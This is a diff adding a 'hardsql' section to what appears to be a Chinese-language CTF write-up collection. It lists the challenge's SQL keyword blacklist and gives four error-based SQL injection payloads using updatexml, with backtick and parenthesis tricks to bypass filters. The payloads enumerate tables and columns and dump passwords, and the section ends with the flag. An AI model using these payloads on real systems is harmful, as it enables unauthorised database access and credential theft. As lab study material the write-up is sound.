@@ -1372,7 +1372,27 @@ echo urlencode("|".serialize($a));
 
 
 
+### hardsql
 
+可以堆叠,可以报错
+
+黑名单:`%00, ,%3d,select|from\B*,union,\*,rand,!,hex,substr`
+
+version:` 10.3.18-MariaDB `
+
+利用括号和反引号来绕过,select后面不能有空格的限制,利用报错来绕过union被ban的限制,用like来绕过=被ban的限制,用right来代替substr
+
+
+
+```
+-(updatexml(1,concat(0x7e,(select(group_concat(table_name))from`information_schema`.`tables`where`TABLE_SCHEMA`like(%27geek%27)),0x7e),1))%23
+#H4rDsq1
+-(updatexml(1,concat(0x7e,(select(group_concat(column_name))from`information_schema`.`columns`where`table_name`like(%27H4rDsq1%27)),0x7e),1))%23
+-(updatexml(1,concat(0x7e,(select(right(group_concat(password),100))from`H4rDsq1`),0x7e),1))%23
+-(updatexml(1,concat(0x7e,(select(right(group_concat(password),30))from`H4rDsq1`),0x7e),1))%23
+```
+
+` flag{430803d9-a16f-402f-93ae-c361c1adaf06} `
 
 ## jarvisoj
 
